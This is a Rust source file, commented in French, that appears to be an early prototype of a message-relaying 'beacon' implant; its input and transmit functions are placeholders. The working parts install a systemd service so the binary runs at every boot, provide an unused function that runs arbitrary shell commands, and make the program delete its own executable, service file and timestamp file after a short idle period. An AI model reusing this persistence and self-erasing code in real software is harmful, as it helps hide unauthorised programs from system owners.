use std::{env, fs};
use std::cell::RefCell;
use std::fs::File;
use std::process::Command;
use std::io::Write;
use std::path::Path;
use chrono::{DateTime, Local};

thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
    fs::read_to_string(TIME).unwrap_or_else(|_err| {
        println!("{}", Local::now());
        Local::now().to_string()
    }).parse::<DateTime<Local>>().expect("failed to parse")
));

static TIME: &str = "./emit";
static SERVICE: &str = "/etc/systemd/system/beacon_need.service";

fn main() {
    run();
}

fn read_entry() -> &'static str {
    //placeholder fonction
    //TODO Truc pour récup' l'entrée
    let entry :&str = "switch toto";
    if !entry.is_empty() {
        update_time();
    }
    entry
}

fn transmit_payload_to_next_beacon(entry_string:&str){
    //placeholder fonction
    println!("{}", entry_string)
}

//Read entry messages and transmit them if they are not the mode switch signal
fn read_and_transmit_as_tower(is_operating_as_transmition_tower:bool) -> bool {
    let entry_string: &str = &read_entry(); //get the entry string
    let wake_up_string: &str = "switch";
    if entry_string.split(' ').next().unwrap() == wake_up_string {
        !is_operating_as_transmition_tower
    } else {
        transmit_payload_to_next_beacon(entry_string);
        is_operating_as_transmition_tower
    }
}

fn exec_command(cmd: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", cmd])
            .output()
            .expect("sh failed to execute")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output()
            .expect("sh failed to execute")
    };
    String::from_utf8(output.stdout).unwrap()
}

fn exec_on_boot() {
    let exe = env::current_exe().expect("Failed to get current exe");
    let mut file = File::create(SERVICE).unwrap();
    writeln!(file,
             "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
             exe.to_str().unwrap()).expect("Unable to Write");
    Command::new("sh")
        .arg("-c")
        .arg("systemctl enable beacon_need.service")
        .spawn()
        .expect("systemctl failed to execute");
}


fn run() {
    //fonction principale d'execution
    let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
    exec_on_boot();
    if !Path::new(TIME).try_exists().expect("cannot check existence") {
        let mut ftime = File::create(TIME).unwrap();
        writeln!(ftime, "{}", Local::now().to_rfc3339()).expect("failed to write in file");
    }

    //boucle principale du programme
    loop {
        if is_operating_as_transmition_tower {
            //act as the transmition tower, aka read for change and forward message
            is_operating_as_transmition_tower = read_and_transmit_as_tower(is_operating_as_transmition_tower);
            println!("je suis une tour");
        } else {
            println!("je suis actif");
        }

        if LAST_ENTRY.with(|instant| {
            Local::now().signed_duration_since(*instant.borrow()).num_seconds() >= 2
        }) {
            //Ne pas oublier de clear les fichiers residuels (startup et log de communication)
            //auto-destruction
            let exe = env::current_exe().expect("Failed to get current exe");
            fs::remove_file(&exe).expect("Failed to delete current exe");
            fs::remove_file(TIME).expect("Failed to delete TIME");
            fs::remove_file(SERVICE).expect("Failed to delete SERVICE");
            break
        }
    }
}

fn update_time() {
    LAST_ENTRY.with(|time| {
        *time.borrow_mut() = Local::now();
        let mut ftime = File::create(TIME).unwrap();
        writeln!(ftime, "{}", &*time.borrow().to_rfc3339())
    }).expect("Failed to write");
}